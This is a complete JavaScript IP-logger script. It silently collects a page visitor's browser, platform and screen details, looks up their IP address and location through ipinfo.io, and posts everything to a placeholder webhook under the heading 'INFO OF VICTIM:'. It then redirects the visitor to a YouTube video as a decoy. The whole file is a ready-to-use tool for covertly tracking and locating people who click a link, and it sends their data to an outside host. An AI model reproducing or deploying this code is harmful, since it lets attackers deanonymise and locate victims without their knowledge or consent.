const deviceInfo = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height
};

fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        const ipInfo = {
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country
        };

        sendToWebhook(deviceInfo, ipInfo);
    })

function sendToWebhook(deviceInfo, ipInfo) {
    const webhookUrl = 'YOUR WEBHOOK URL';

    const data = {
        content: '@everyone NEW LOG',
        embeds: [
            {
                title: 'INFO OF VICTIM:',
                fields: [
                    { name: 'User Agent', value: deviceInfo.userAgent },
                    { name: 'Browser language', value: deviceInfo.language },
                    { name: 'Platform', value: deviceInfo.platform },
                    { name: 'Screen width', value: deviceInfo.screenWidth },
                    { name: 'Screen height', value: deviceInfo.screenHeight },
                    { name: 'IP adress', value: ipInfo.ip },
                    { name: 'City', value: ipInfo.city },
                    { name: 'Region', value: ipInfo.region },
                    { name: 'Country', value: ipInfo.country }
                ]
            }
        ]
    };

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
}

setTimeout(() => {
    window.location.href = 'https://youtu.be/xvFZjo5PgG0?si=kUG7m-7LleaxmoX1';
}, 3000);